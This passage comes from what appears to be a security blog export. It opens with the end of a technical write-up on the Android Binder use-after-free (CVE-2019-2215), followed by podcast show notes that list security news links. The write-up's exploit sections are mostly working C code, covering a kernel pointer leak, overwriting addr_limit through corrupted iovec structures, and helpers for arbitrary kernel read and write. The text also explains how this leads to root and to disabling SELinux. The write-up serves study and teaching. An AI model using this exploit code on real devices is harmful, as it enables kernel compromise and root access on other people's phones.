will write two pages of data. The first page will contain data from <code>dummy_page</code>, which isn't useful for exploitation. The second page will contain kernel data!</p><p>It's easier to handle the reads and writes in two separate threads. The parent thread is responsible for:</p><ol><li>Triggering the free() on <code>binder_thread</code></li><li>Writing the <code>iovec</code> stack to the pipe connected to the child process, which will overlap the free'd <code>binder_thread</code></li><li>(waits on the child thread)</li><li>Reading the second page of leaked kernel data</li></ol><p>The child thread is responsible for:</p><ol><li>Corrupting the <code>iovec</code> by triggering the unlink via deletion of the EPOLL event</li><li>Reading the first page of dummy data</li></ol><p>When we put this all together, here's our leak code: (note that functionally this is similar to p0's except I cleaned it up a bit and ported it to an app, hence <code>__android_log_print()</code>)</p><pre><code class=\"language-c\">struct epoll_event event = {.events = EPOLLIN};\nstruct iovec iovec_array[IOVEC_ARRAY_SZ];\nchar leakBuff[0x1000];\nint pipefd[2];\nint byteSent;\npid_t pid;\n\nmemset(iovec_array, 0, sizeof(iovec_array));\n\nif(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event))\n    exitWithError(\"EPOLL_CTL_ADD failed: %s\", strerror(errno));\n\niovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; // mutex\niovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; // linked list next\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; // linked list prev\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;\n\nif(pipe(pipefd))\n    exitWithError(\"Pipe failed: %s\", strerror(errno));\n\nif(fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000) != 0x1000)\n    exitWithError(\"F_SETPIPE_SZ failed: %s\", strerror(errno));\n\npid = fork();\n\nif(pid == 0)\n{\n    prctl(PR_SET_PDEATHSIG, SIGKILL);\n    sleep(2);\n\n    epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &amp;event);\n\n    if(read(pipefd[0], leakBuff, sizeof(leakBuff)) != sizeof(leakBuff))\n        exitWithError(\"[CHILD] Read failed: %s\", strerror(errno));\n\n    close(pipefd[1]);\n    _exit(0);\n}\n\nioctl(fd, BINDER_THREAD_EXIT, NULL);\nbyteSent = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);\n\nif(byteSent != 0x2000)\n    exitWithError(\"[PARENT] Leak failed: writev returned %d, expected 0x2000.\", byteSent);\n\nif(read(pipefd[0], leakBuff, sizeof(leakBuff)) != sizeof(leakBuff))\n    exitWithError(\"[PARENT] Read failed: %s\", strerror(errno));\n\n__android_log_print(ANDROID_LOG_INFO, \"EXPLOIT\", \"leak + 0xE8 = %lx\\n\", *(uint64_t *)(leakBuff + 0xE8));\nthread_info = *(unsigned long *)(leakBuff + 0xE8);\n</code></pre><p>When we run this app, we'll get something similar to the following in logcat:</p><pre><code class=\"language-text\">com.example.binderuaf I/EXPLOIT: leak + 0xE8 = fffffffec88c5700\n</code></pre><p>This pointer points to the current process <code>thread_info</code> struct. This structure has a very useful field we can leverage to get an arbitrary read/write primitive.</p><h2 id=\"establishing-an-arbitrary-read-write-arbitrary-r-w-primitive\">Establishing an arbitrary read/write (arbitrary r/w) primitive</h2><h3 id=\"breaking-the-limits\">Breaking the limits</h3><p>So we've leaked a useful kernel pointer, now what? Let's take a look at the first few members of <code>task_info</code>, the object we're leaking the address of.</p><pre><code class=\"language-c\">struct thread_info {\n\tunsigned long\t\tflags;\t\t/* low level flags */\n\tmm_segment_t\t\taddr_limit;\t/* address limit */\n\tstruct task_struct\t*task;\t\t/* main task structure */\n\tint\t\t\tpreempt_count;\t    /* 0 =&gt; preemptable, &lt;0 =&gt; bug */\n\tint\t\t\tcpu;\t\t\t   /* cpu */\n};\n</code></pre><p>The field of interest here is <code>addr_limit</code>. There are some very important macros that reference this field in terms of security. Let's look at one of them - <code>access_ok</code>.</p><pre><code class=\"language-c\">#define access_ok(type, addr, size)\t__range_ok(addr, size)\n</code></pre><p>From the comment of <code>__range_ok()</code> - it's essentially equivalent to <code>(u65)addr + (u65)size &lt;= current-&gt;addr_limit</code>. This macro is used pretty much <em>everywhere</em> the kernel tries to access a user-provided pointer. It's used to ensure the pointer provided is <em>really</em> a userland pointer - and prevents people from trying to be clever by passing kernel pointers where the kernel expects userland pointers. See where I'm going with this? :)</p><p>Once this <code>addr_limit</code> is smashed, you can freely pass kernel pointers into where userland pointers are expected, and <code>access_ok()</code> will <em>never</em> fail.</p><h3 id=\"getting-a-controlled-write-primitive\">Getting a controlled write primitive</h3><p>We've already demonstrated we can use the unlink to read and leak kernel data - but what about modify it? Turns out we can do that too! To leak kernel data, we wrote non-contiguously into a file descriptor with a stack of <code>iovec</code> structures, and corrupted one of them with the unlink so that a <code>read()</code> call later on would leak data.</p><p>To corrupt kernel data, we go the other way. By calling <code>recvmsg()</code> with a stack of <code>iovec</code> structures and corrupting it the same way, we can force the data we wrote using <code>write()</code> to be copied over the sequential <code>iovec</code> structures to get an arbitrary write.</p><p>Let's look at the <code>iovec</code> stack we slot into our UAF'd object with <code>recvmsg()</code>.</p><pre><code class=\"language-c\">iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; // mutex\niovec_array[IOVEC_INDX_FOR_WQ].iov_len = 1; // linked list next\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; // linked list prev\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x8 + 2 * 0x10; // iov_len of previous, then this element and next element\niovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD;\niovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = 8;\n</code></pre><p>Similar to the infoleak case, the unlink corrupts the <code>IOVEC_INDX_FOR_WQ</code>'s <code>iovec.iov_len</code> and <code>IOVEC_INDEX_FOR_WQ + 1</code>'s <code>iovec.iov_base</code> with kernel pointers pointing directly to <code>IOVEC_INDX_FOR_WQ</code>'s <code>iovec.iov_len</code>, however, this time it's splitting data we've written using these <code>iovec</code> structures.</p><p>Just like the infoleak case, the unlink corrupts the <code>iov_len</code> of the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code>, and the <code>iov_base</code> of the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> with a kernel pointer. This kernel pointer isn't just pointing into some random data somewhere - if we take a look at the KGDB output again, we'll notice it points to <code>iov_len</code> of the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code>!</p><figure class=\"kg-card kg-image-card\"><img src=\"https://i.imgur.com/xW4LRCS.png\" class=\"kg-image\" alt=\"gdb\"></figure><p>Once <code>recvmsg()</code> reaches this <code>iovec</code>, it will start copying the data we wrote with <code>write()</code> into this pointer - which allows us to write arbitrary data into the following <code>iovec</code> structs <em>post-validation</em>. This allows us to pass any pointer we want into the <code>iov_base</code> of the next <code>iovec</code> - giving us an arbitrary write. We control what gets written to this address with the tailing QWORD of the <code>write()</code>.</p><p>If we look at the data that gets written, we can indeed see that it aligns with the backing data of <code>iov_len</code> at <code>IOVEC_INDX_FOR_WQ</code> onwards.</p><pre><code class=\"language-c\">unsigned long second_write_chunk[] = {\n    1, /* iov_len */\n    0xdeadbeef, /* iov_base (already used) */\n    0x8 + 2 * 0x10, /* iov_len (already used) */\n    current_ptr + 0x8, /* next iov_base (addr_limit) */\n    8, /* next iov_len (sizeof(addr_limit)) */\n    0xfffffffffffffffe /* value to write */\n};\n</code></pre><p>The attack strategy is as follows:</p><ol><li>Create a socketpair</li><li>Trigger the free() on the <code>binder_thread</code> object so that <code>recvmsg()</code>'s <code>iovec</code> stack overlaps <code>binder_thread</code></li><li>Preemptively write 1 byte to satisfy the first <code>iovec</code></li><li>Write the <code>iovec</code> structures into <code>binder_thread</code>'s old memory via <code>recvmsg()</code></li><li>Trigger the use-after-free / unlink to corrupt the <code>iovec</code> structure</li><li>Call <code>write()</code> on the socketpair, which will use the corrupted <code>iovec</code> to corrupt the next <code>iovec</code> to do a controlled memory corruption.</li></ol><p>Again just like the leak, two threads are needed. The parent thread is responsible for:</p><ol><li>Preemptively writing 1 byte of data to satisfy <code>recvmsg()</code>'s first <code>iovec</code> request.</li><li>Triggering the free() on <code>binder_thread</code></li><li>Writing the <code>iovec</code> stack to the socket and waiting on data that matches the <code>iovec</code> requests via <code>recvmsg()</code></li></ol><p>The child thread is responsible for:</p><ol><li>Corrupting the <code>iovec</code> by triggering the unlink via deletion of the EPOLL event</li><li>Writing the data that will corrupt the proceeding <code>iovec</code> structures when the parent thread's <code>recvmsg()</code> call continues.</li></ol><p>Putting this all together, we end up with the following code to smash the parent process <code>addr_limit</code>. Again, functionally this code is the same as p0's however it's cleaned up and uses JNI functions.</p><pre><code class=\"language-c\">#define OFFSET_OF_ADDR_LIMIT 8\n\nstruct epoll_event event = {.events = EPOLLIN};\nstruct iovec iovec_array[IOVEC_ARRAY_SZ];\nint iovec_corruption_payload_sz;\nint sockfd[2];\nint byteSent;\npid_t pid;\n\nmemset(iovec_array, 0, sizeof(iovec_array));\n\nif(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event))\n    exitWithError(\"EPOLL_CTL_ADD failed: %s\", strerror(errno));\n\nunsigned long iovec_corruption_payload[] = {\n        1,                  // IOVEC_INDX_FOR_WQ -&gt; iov_len\n        0xdeadbeef,         // IOVEC_INDX_FOR_WQ + 1 -&gt; iov_base\n        0x8 + (2 * 0x10),   // IOVEC_INDX_FOR_WQ + 1 -&gt; iov_len\n        thread_info + OFFSET_OF_ADDR_LIMIT, // Arb. Write location! IOVEC_INDEX_FOR_WQ + 2 -&gt; iov_base\n        8,                  // Arb. Write size (only need a QWORD)! IOVEC_INDEX_FOR_WQ + 2 -&gt; iov_len\n        0xfffffffffffffffe, // Arb. Write value! Smash it so we can write anywhere.\n};\n\niovec_corruption_payload_sz = sizeof(iovec_corruption_payload);\n\niovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; // mutex\niovec_array[IOVEC_INDX_FOR_WQ].iov_len  = 1; // only ask for one byte since we'll only write one byte - linked list next\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; // linked list prev\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len  = 0x8 + 2 * 0x10;     // length of previous iovec + this one + the next one\niovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD; // will get smashed by iovec_corruption_payload\niovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len  = 8;\n\nif(socketpair(AF_UNIX, SOCK_STREAM, 0, sockfd))\n    exitWithError(\"Socket pair failed: %s\", strerror(errno));\n\n// Preemptively satisfy the first iovec request\nif(write(sockfd[1], \"X\", 1) != 1)\n    exitWithError(\"Write 1 byte failed: %s\", strerror(errno));\n\npid = fork();\n\nif(pid == 0)\n{\n    prctl(PR_SET_PDEATHSIG, SIGKILL);\n    sleep(2);\n\n    epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &amp;event);\n\n    byteSent = write(sockfd[1], iovec_corruption_payload, iovec_corruption_payload_sz);\n\n    if(byteSent != iovec_corruption_payload_sz)\n        exitWithError(\"[CHILD] Write returned %d, expected %d.\", byteSent, iovec_corruption_payload_sz);\n\n    _exit(0);\n}\n\nioctl(fd, BINDER_THREAD_EXIT, NULL);\n\nstruct msghdr msg = {\n        .msg_iov = iovec_array,\n        .msg_iovlen = IOVEC_ARRAY_SZ\n};\n\nrecvmsg(sockfd[0], &amp;msg, MSG_WAITALL);\n</code></pre><h3 id=\"arbitrary-read-write-helper-functions\">Arbitrary Read/Write Helper Functions</h3><p>Now that the process address limit has been smashed, arbitrary kernel read/write is as simple as a few <code>read()</code> and <code>write()</code> syscalls. By simply writing the data we want to write to a pipe with <code>write()</code>, and calling <code>read()</code> on the other end of the pipe with a kernel address, we can pipe data to an arbitrary kernel address.</p><p>Conversely, by writing data from an arbitrary kernel address to a pipe, and calling <code>read()</code> on the other end of the pipe, we can pipe data from an arbitrary kernel address. Boom, arbitrary read/write!</p><pre><code class=\"language-c\">int kernel_rw_pipe[2];\n\n//...\n\nif(pipe(kernel_rw_pipe))\n    exitWithError(\"Kernel R/W Pipe failed: %s\", strerror(errno));\n\n//...\n\nvoid kernel_write(unsigned long kaddr, void *data, size_t len)\n{\n    if(len &gt; 0x1000)\n        exitWithError(\"Reads/writes over the size of a page results causes issues.\");\n    \n    if(write(kernel_rw_pipe[1], data, len) != len)\n        exitWithError(\"Failed to write data to kernel (write)!\");\n    \n    if(read(kernel_rw_pipe[0], (void *)kaddr, len) != len)\n        exitWithError(\"Failed to write data to kernel (read)!\");\n}\n\nvoid kernel_read(unsigned long kaddr, void *data, size_t len)\n{\n    if(len &gt; 0x1000)\n        exitWithError(\"Reads/writes over the size of a page results causes issues.\");\n    \n    if(write(kernel_rw_pipe[1], (void *)kaddr, len) != len)\n        exitWithError(\"Failed to read data from kernel (write)!\");\n    \n    if(read(kernel_rw_pipe[0], data, len) != len)\n        exitWithError(\"Failed to read data from kernel (read)!\");\n}\n</code></pre><h2 id=\"additional-notes\">Additional Notes</h2><p>Some devices (even if they're vulnerable) may fail on the <code>writev()</code> in the leak call, as it'll return 0x1000 instead of the desired 0x2000. This is usually because the offset for the waitqueue is incorrect, therefore the second <code>iovec.iov_base</code> isn't getting smashed with a kernel pointer. This will cause the call to return 0x1000 because the second request will fail, since <code>0xdeadbeef</code> is an unmapped address.</p><p>In this case, you'll have to extract the kernel image for the version you're targeting and pull the proper offsets (or potentially bruteforce it).</p><h2 id=\"conclusion\">Conclusion</h2><p>Once you have kernel read/write, it's basically game over. A root shell is a <code>cred</code> patch away. If you're not on a Samsung device, you can take it a step further and disable SELinux and patch the <code>init_task</code> credentials so every new process that launches post-exploit automatically launches with full privileges. On Samsung devices, I do not believe this is possible without extra work due to their Knox mitigation. On most other devices though, these additional patches shouldn't be an issue.</p><p>It's worth noting that p0's exploit is remarkably stable. It very rarely fails, and when it does it's usually just an error, not a kernel panic, so you just need to run the exploit again and you're good to go. This makes it an awesome temporary root method for people with OEM locked bootloaders like me.</p><p>Overall, I thought this exploit strategy by Jann Horn and Maddie Stone was pretty novel, and I definitely learned a lot breaking it down. It gave me a fresh perspective on use-after-free's, demonstrating that you're not totally out of luck if you can't get a useful primitive from the UAF'd object itself.</p><h2 id=\"references-additional-resources\">References / Additional Resources</h2><p><a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1942\">Issue 1942: Android; Use-After-Free in Binder driver (Chromium Bug Tracker) </a></p><p><a href=\"https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885\">Project Zero Exploit</a></p><p><a href=\"https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ\">Syzkaller kASAN report</a></p><p><a href=\"https://elixir.bootlin.com/linux/v4.4.177/source\">Bootlin Linux kernel source browser</a></p><h2 id=\"credit\">Credit</h2><p>Jann Horn and Maddie Stone for the exploit code referenced in the write-up.</p>","slug":"analyzing-androids-cve-2019-2215-dev-binder-uaf"}},{"node":{"title":"Episode 16 - A Bit of everything: 0days, Breaches, Lawsuits, Attacking AI, and some insecure","path":"/posts/episode-16-a-bit-of-everything-0days-breaches-lawsuits-attacking-ai-and-some-insecure/","date":"5 November 2019","description":"   ","content":"<figure class=\"kg-card kg-embed-card\"><iframe width=\"480\" height=\"270\" src=\"https://www.youtube.com/embed/xeb7IMo7XMM?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe></figure><!--kg-card-begin: markdown--><p>Watch the podcast live every Monday afternoon at 12:00pm PST (3:00pm EST) on Twitch <a href=\"https://twitch.tv/dayzerosec\">(@Dayzerosec)</a></p>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h05m23s\">00:05:23</a>] Apple v. Corellium</p>\n<ul>\n<li><a href=\"https://twitter.com/msuiche/status/1189055861576126464?s=19\">https://twitter.com/msuiche/status/1189055861576126464?s=19</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h12m04s\">00:12:04</a>] Firefox to Discontinue Sideloaded Extensions</p>\n<ul>\n<li><a href=\"https://blog.mozilla.org/addons/2019/10/31/firefox-to-discontinue-sideloaded-extensions/\">https://blog.mozilla.org/addons/2019/10/31/firefox-to-discontinue-sideloaded-extensions/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h16m52s\">00:16:52</a>] Delegated Credentials for TLS</p>\n<ul>\n<li><a href=\"https://blog.cloudflare.com/keyless-delegation/\">https://blog.cloudflare.com/keyless-delegation/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h23m02s\">00:23:02</a>] North Korean Malware Found on Indian Nuclear Plant's Network</p>\n<ul>\n<li><a href=\"https://www.zdnet.com/article/confirmed-north-korean-malware-found-on-indian-nuclear-plants-network/\">https://www.zdnet.com/article/confirmed-north-korean-malware-found-on-indian-nuclear-plants-network/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h28m20s\">00:28:20</a>] The Pirate Bay Downtime Caused by Malicious Search Queries</p>\n<ul>\n<li><a href=\"https://torrentfreak.com/pirate-bay-downtime-caused-by-malicious-attack-proxies-may-be-to-blame/\">https://torrentfreak.com/pirate-bay-downtime-caused-by-malicious-attack-proxies-may-be-to-blame/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h29m30s\">00:29:30</a>] Web.com Breach (allegedly includes NetworkSolutions.com and Register.com)</p>\n<ul>\n<li><a href=\"https://notice.web.com/\">https://notice.web.com/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h32m28s\">00:32:28</a>] BlueKeep attacks are happening, but it's not a worm</p>\n<ul>\n<li><a href=\"https://www.zdnet.com/article/bluekeep-attacks-are-happening-but-its-not-a-worm/\">https://www.zdnet.com/article/bluekeep-attacks-are-happening-but-its-not-a-worm/</a></li>\n<li><a href=\"https://www.kryptoslogic.com/blog/2019/11/bluekeep-cve-2019-0708-exploitation-spotted-in-the-wild/\">https://www.kryptoslogic.com/blog/2019/11/bluekeep-cve-2019-0708-exploitation-spotted-in-the-wild/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h36m13s\">00:36:13</a>] Untitled Goose Game - Insecure Deserialization</p>\n<ul>\n<li><a href=\"https://pulsesecurity.co.nz/advisories/untitled-goose-game-deserialization\">https://pulsesecurity.co.nz/advisories/untitled-goose-game-deserialization</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h39m58s\">00:39:58</a>] Two Chrome 0Days get Patched</p>\n<ul>\n<li><a href=\"https://chromereleases.googleblog.com/2019/10/stable-channel-update-for-desktop_31.html\">https://chromereleases.googleblog.com/2019/10/stable-channel-update-for-desktop_31.html</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h42m45s\">00:42:45</a>] NFC Beaming Bypasses Security Controls in Android [CVE-2019-2114]</p>\n<ul>\n<li><a href=\"https://wwws.nightwatchcybersecurity.com/2019/10/24/nfc-beaming-bypasses-security-controls-in-android-cve-2019-2114/\">https://wwws.nightwatchcybersecurity.com/2019/10/24/nfc-beaming-bypasses-security-controls-in-android-cve-2019-2114/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h45m43s\">00:45:43</a>] Abusing HTTP Hop-by-hop Request Headers</p>\n<ul>\n<li><a href=\"https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers\">https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h50m54s\">00:50:54</a>] Let's Make Windows Defender Angry: Antivirus Can be an Oracle! -icchy</p>\n<ul>\n<li><a href=\"https://speakerdeck.com/icchy/lets-make-windows-defender-angry-antivirus-can-be-an-oracle\">https://speakerdeck.com/icchy/lets-make-windows-defender-angry-antivirus-can-be-an-oracle</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/EICAR_test_file\">https://en.wikipedia.org/wiki/EICAR_test_file</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h56m54s\">00:56:54</a>] rConfig v3.9.2 authenticated and unauthenticated RCE (CVE-2019-16663) and (CVE-2019-16662)</p>\n<ul>\n<li><a href=\"https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/\">https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=01h02m26s\">01:02:26</a>] Making an Invisibility Cloak: Real World Adversarial Attacks on Object Detectors</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1910.14667v1\">https://arxiv.org/abs/1910.14667v1</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=01h07m26s\">01:07:26</a>] Silhouette: Efficient Intra-Address Space Isolation for Protected Shadow Stacks on Embedded Systems</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1910.12157\">https://arxiv.org/abs/1910.12157</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=01h19m46s\">01:19:46</a>] unfork(2)</p>\n<ul>\n<li><a href=\"https://github.com/whitequark/unfork\">https://github.com/whitequark/unfork</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=01h23m51s\">01:23:51</a>] Destroying x86_64 instruction decoders with differential fuzzing</p>\n<ul>\n<li><a href=\"https://blog.trailofbits.com/2019/10/31/destroying-x86_64-instruction-decoders-with-differential-fuzzing/\">https://blog.trailofbits.com/2019/10/31/destroying-x86_64-instruction-decoders-with-differential-fuzzing/</a></li>\n<li><a href=\"https://github.com/zyantific/zydis\">https://github.com/zyantific/zydis</a></li>\n</ul>\n<!--kg-card-end: markdown--><p></p>","slug":"episode-16-a-bit-of-everything-0days-breaches-lawsuits-attacking-ai-and-some-insecure"}},{"node":{"title":"Episode 15 - NordVPN Again, Snowden, CPDoS, a PHP-RCE, and some console hacking","path":"/posts/episode-15-nordvpn-again-snowden-cpdos-a-php-rce-and-some-console-hacking/","date":"28 October 2019","description":"   ","content":"<figure class=\"kg-card kg-embed-card\"><iframe width=\"480\" height=\"270\" src=\"https://www.youtube.com/embed/VJtOAfM_0j0?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe></figure><!--kg-card-begin: markdown--><p>Watch the podcast live every Monday afternoon at 12:00pm PST (3:00pm EST) on Twitch <a href=\"https://twitch.tv/dayzerosec\">(@Dayzerosec)</a></p>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=00h00m49s\">00:00:49</a>] NordVPN's Response to Private Certificate Breach Discussed Last Week</p>\n<ul>\n<li><a href=\"https://nordvpn.com/blog/official-response-datacenter-breach/\">https://nordvpn.com/blog/official-response-datacenter-breach/</a></li>\n<li><a href=\"https://nordvpn.com/blog/security-plan/\">https://nordvpn.com/blog/security-plan/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=00h12m31s\">00:12:31</a>] AWS Hit By major DDOS Attack</p>\n<ul>\n<li><a href=\"https://www.techradar.com/news/aws-hit-by-major-ddos-attack\">https://www.techradar.com/news/aws-hit-by-major-ddos-attack</a></li>\n<li><a href=\"https://status.digitalocean.com/incidents/1z3kmlvz69v6\">https://status.digitalocean.com/incidents/1z3kmlvz69v6</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=00h14m43s\">00:14:43</a>] Seven Million Adobe Creative Cloud Accounts Exposed to the Public</p>\n<ul>\n<li><a href=\"https://www.comparitech.com/blog/information-security/7-million-adobe-creative-cloud-accounts-exposed-to-the-public/\">https://www.comparitech.com/blog/information-security/7-million-adobe-creative-cloud-accounts-exposed-to-the-public/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=00h25m24s\">00:25:24</a>] Travel Reservations Platform Leaks US Government Personnel Data</p>\n<ul>\n<li><a href=\"https://www.vpnmentor.com/blog/us-travel-military-leak/\">https://www.vpnmentor.com/blog/us-travel-military-leak/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=00h30m09s\">00:30:09</a>] Joe Rogan Experience #1368 - Edward Snowden</p>\n<ul>\n<li><a href=\"https://www.youtube.com/watch?v=efs3QRr8LWw&amp;feature=youtu.be&amp;t=2h35m10s\">https://www.youtube.com/watch?v=efs3QRr8LWw&amp;feature=youtu.be&amp;t=2h35m10s</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=00h48m38s\">00:48:38</a>] Technical Analysis of Checkm8</p>\n<ul>\n<li><a href=\"https://habr.com/en/company/dsec/blog/472762/\">https://habr.com/en/company/dsec/blog/472762/</a></li>\n<li><a href=\"https://googleprojectzero.blogspot.com/2019/10/ktrw-journey-to-build-debuggable-iphone.html\">https://googleprojectzero.blogspot.com/2019/10/ktrw-journey-to-build-debuggable-iphone.html</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=00h55m51s\">00:55:51</a>] Cache Poisoned Denial of Service (CPDoS)</p>\n<ul>\n<li><a href=\"https://cpdos.org/\">https://cpdos.org/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=01h08m27s\">01:08:27</a>] CVE-2019-11043 - PHP-FPM (potential) RCE</p>\n<ul>\n<li><a href=\"https://github.com/neex/phuip-fpizdam/\">https://github.com/neex/phuip-fpizdam/</a></li>\n<li><a href=\"https://github.com/neex/phuip-fpizdam/blob/master/attack.go\">https://github.com/neex/phuip-fpizdam/blob/master/attack.go</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=01h20m44s\">01:20:44</a>] Light Ears: Information Leakage via Smart Lights</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1808.07814\">https://arxiv.org/abs/1808.07814</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=01h27m57s\">01:27:57</a>] Donâ€™t open that XML: XXE to RCE in XML plugins for VS Code, Eclipse, Theia, â€¦</p>\n<ul>\n<li><a href=\"https://www.shielder.it/blog/dont-open-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/?preview=true\">https://www.shielder.it/blog/dont-open-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/?preview=true</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=01h33m28s\">01:33:28</a>] Bringing ICS into the Pwn2Own World</p>\n<ul>\n<li><a href=\"https://www.zerodayinitiative.com/blog/2019/10/28/pwn2own-miami-bringing-ics-into-the-pwn2own-world\">https://www.zerodayinitiative.com/blog/2019/10/28/pwn2own-miami-bringing-ics-into-the-pwn2own-world</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=01h37m39s\">01:37:39</a>] Analysis of Qualcomm Secure Boot Chains</p>\n<ul>\n<li><a href=\"https://blog.quarkslab.com/analysis-of-qualcomm-secure-boot-chains.html\">https://blog.quarkslab.com/analysis-of-qualcomm-secure-boot-chains.html</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=01h39m56s\">01:39:56</a>] Microsoft Secured-Core PC</p>\n<ul>\n<li><a href=\"https://www.microsoft.com/security/blog/2019/10/21/microsoft-and-partners-design-new-device-security-requirements-to-protect-against-targeted-firmware-attacks/\">https://www.microsoft.com/security/blog/2019/10/21/microsoft-and-partners-design-new-device-security-requirements-to-protect-against-targeted-firmware-attacks/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=VJtOAfM_0j0&amp;t=01h47m46s\">01:47:46</a>] Guarding Against Physical Attacks: The Xbox One Story</p>\n<ul>\n<li><a href=\"https://www.platformsecuritysummit.com/2019/speaker/chen/\">https://www.platformsecuritysummit.com/2019/speaker/chen/</a></li>\n</ul>\n<!--kg-card-end: markdown-->","slug":"episode-15-nordvpn-again-snowden-cpdos-a-php-rce-and-some-console-hacking"}},{"node":{"title":"Episode 14 - Linux Exploits, Secure Credentials, Side-Channels and Election(SDK) hacking","path":"/posts/episode-14-linux-exploits-secure-credentials-side-channels-and-election-sdk-hacking/","date":"21 October 2019","description":"   ","content":"<figure class=\"kg-card kg-embed-card\"><iframe width=\"480\" height=\"270\" src=\"https://www.youtube.com/embed/zNWNCtzWI9I?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe></figure><!--kg-card-begin: markdown--><p>Watch the podcast live every Monday afternoon at 12:00pm PST (3:00pm EST) on 